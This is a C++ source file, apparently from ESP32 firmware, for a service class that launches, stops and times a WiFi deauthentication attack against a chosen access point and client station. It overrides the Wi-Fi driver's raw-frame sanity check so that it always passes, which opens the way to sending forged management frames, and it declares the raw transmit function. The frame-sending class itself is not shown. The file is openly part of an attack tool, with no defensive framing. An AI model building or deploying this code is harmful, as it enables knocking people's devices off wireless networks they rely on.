#include "Networks/Services/AttackService.h"

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);


AttackService::AttackService(){
}

AttackService::~AttackService() {
    stopAttack();
}

void AttackService::startDeauthAttack(const MacAddress& sourceAP, const MacAddress& targetSTA, unsigned int seconds){
    stopAttack();

    deauthAttack = new AttackDeauth(sourceAP, targetSTA);

    startMillis = millis();
    deauthAttack->start(seconds);
    
    currentType = attack_t::Deauth;
    currentStatus = deauthAttack->getStatus();

    elapsedMillis = millis();
}

void AttackService::stopAttack(){
    if(currentType == attack_t::Deauth){
        delete deauthAttack;
        deauthAttack = nullptr;
    }

    currentType = attack_t::None;
    currentStatus = attack_status_t::Idle;
}

attack_t AttackService::getCurrentType() const {
    return currentType;
}

attack_status_t AttackService::getCurrentStatus() const {
    return currentStatus;
}

unsigned long AttackService::getExecutionTime(){
    return elapsedMillis != 0 ? elapsedMillis - startMillis : 0;
}